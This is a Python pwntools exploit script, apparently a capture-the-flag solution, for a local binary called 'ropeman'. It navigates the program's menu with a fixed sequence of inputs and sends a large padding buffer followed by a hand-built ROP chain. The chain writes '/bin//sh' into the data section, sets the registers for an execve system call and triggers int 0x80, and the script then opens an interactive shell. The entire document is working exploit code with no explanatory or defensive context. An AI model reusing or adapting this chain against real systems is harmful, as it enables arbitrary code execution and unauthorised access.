import struct
from pwn import *
from time import sleep
from struct import pack

def getpayload():
    p = ''
    p += "S"*0x26b4
    p += "AAAA"
    p += pack('<I', 0x0807627a) # pop edx ; ret
    p += pack('<I', 0x080f9060) # @ .data
    p += pack('<I', 0x080c22f6) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x08073506) # mov dword ptr [edx], eax ; pop ebx ; ret
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x0807627a) # pop edx ; ret
    p += pack('<I', 0x080f9064) # @ .data + 4
    p += pack('<I', 0x080c22f6) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x08073506) # mov dword ptr [edx], eax ; pop ebx ; ret
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x0807627a) # pop edx ; ret
    p += pack('<I', 0x080f9068) # @ .data + 8
    p += pack('<I', 0x0806f160) # xor eax, eax ; pop edi ; ret
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08073506) # mov dword ptr [edx], eax ; pop ebx ; ret
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x080481d9) # pop ebx ; ret
    p += pack('<I', 0x080f9060) # @ .data
    p += pack('<I', 0x080ef9a3) # pop ecx ; ret
    p += pack('<I', 0x080f9068) # @ .data + 8
    p += pack('<I', 0x0807627a) # pop edx ; ret
    p += pack('<I', 0x080f9068) # @ .data + 8
    p += pack('<I', 0x0806f160) # xor eax, eax ; pop edi ; ret
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x08082d66) # inc eax ; ret
    p += pack('<I', 0x0804ae81) # int 0x80
    return p
def exploit():

    prog = process('./ropeman')
    prog.sendline('l')
    time.sleep(0.1)
    prog.sendline('a')
    time.sleep(0.1)
    prog.sendline('a')
    time.sleep(0.1)
    prog.sendline('c')
    time.sleep(0.1)
    prog.sendline('0')
    time.sleep(0.1)
    for x in range(0, 6):
        prog.sendline('z')
        time.sleep(0.1)
    prog.sendline(getpayload())
    prog.interactive()

if __name__ == "__main__":
    #print getpayload()
    exploit()
